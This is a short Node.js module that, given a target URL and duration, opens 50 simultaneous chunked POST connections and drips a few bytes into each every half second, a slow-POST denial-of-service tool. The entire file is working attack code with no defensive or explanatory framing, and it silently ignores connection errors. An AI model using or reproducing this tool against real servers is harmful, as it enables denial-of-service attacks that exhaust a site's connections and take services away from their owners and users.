const http = require("http");
const https = require("https");
const { URL } = require("url");

module.exports = function (target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function sendSlow() {
    const options = {
      method: "POST",
      hostname: url.hostname,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      path: url.pathname || "/",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked",
        "User-Agent": "SlowRequestBot/1.0"
      }
    };

    const req = client.request(options);
    let count = 0;

    const slowInterval = setInterval(() => {
      if (Date.now() >= end || count > 100) {
        clearInterval(slowInterval);
        req.end();
        return;
      }

      req.write("x=1&");
      count++;
    }, 500); // sends 1 small chunk every 500ms

    req.on("error", () => {});
  }

  for (let i = 0; i < 50; i++) sendSlow(); // launch 50 slow connections
};
